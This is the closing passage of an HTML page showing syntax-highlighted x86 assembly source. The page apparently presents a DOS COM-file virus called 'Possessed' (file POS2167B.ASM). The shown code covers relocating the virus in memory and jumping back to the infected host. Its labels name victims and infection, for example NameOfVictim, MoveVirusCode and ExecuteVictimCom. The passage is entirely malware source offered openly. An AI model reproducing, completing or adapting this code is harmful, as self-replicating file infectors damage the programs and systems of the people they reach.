 </span><span class="sc5">NameOfVictim</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">13</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
 
 </span><span class="sc9">assume</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">Possessed</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">Possessed</span><span class="sc0">
 
 </span><span class="sc5">NotFirstGeneration</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VictimCode</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">ComLength</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
 
 </span><span class="sc5">ExecuteVictimCom</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VictimCode</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">ComLength</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">
       </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
       </span><span class="sc6">cld</span><span class="sc0">
       </span><span class="sc6">repe</span><span class="sc0"> </span><span class="sc6">movsw</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
       </span><span class="sc6">clc</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
 
 </span><span class="sc5">MoveVirusCode</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">MoveVirusCode</span><span class="sc0">
       </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
       </span><span class="sc6">cld</span><span class="sc0">
       </span><span class="sc6">repe</span><span class="sc0"> </span><span class="sc6">movsw</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VictimCode</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">MoveVirusCode</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">VirusJumperSegment</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">VirusJumperOffset</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">SecondMove</span><span class="sc0">
 
 </span><span class="sc9">assume</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">Possessed</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">nothing</span><span class="sc0">
 
       </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">VirusJumper</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">
 
 </span><span class="sc5">VirusStack</span><span class="sc0">              </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">35</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
 </span><span class="sc1">;----------------------------------------------- com host code starts here</span><span class="sc0">
 </span><span class="sc5">VictimCode</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Terminated</span><span class="sc0">
 
 </span><span class="sc5">VirusAsciiz</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">13</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
 </span><span class="sc5">ExecParam</span><span class="sc0">               </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">7</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
 </span><span class="sc5">Terminated</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4ch</span><span class="sc0">
       </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
 
 </span><span class="sc5">ExecuteVictimComFromEof</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VictimCode</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">ComLength</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">
       </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
       </span><span class="sc6">cld</span><span class="sc0">
       </span><span class="sc6">repe</span><span class="sc0"> </span><span class="sc6">movsw</span><span class="sc0">  
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
       </span><span class="sc6">clc</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
 
 </span><span class="sc5">Possessed</span><span class="sc0"> </span><span class="sc9">ends</span><span class="sc0">
 
 </span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">PossessedEntry</span><span class="sc0">
 
 
</span><span class="sc1">; ฤฤ POS2167B.ASM ENDS HERE ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ</span></div></body>
</html>
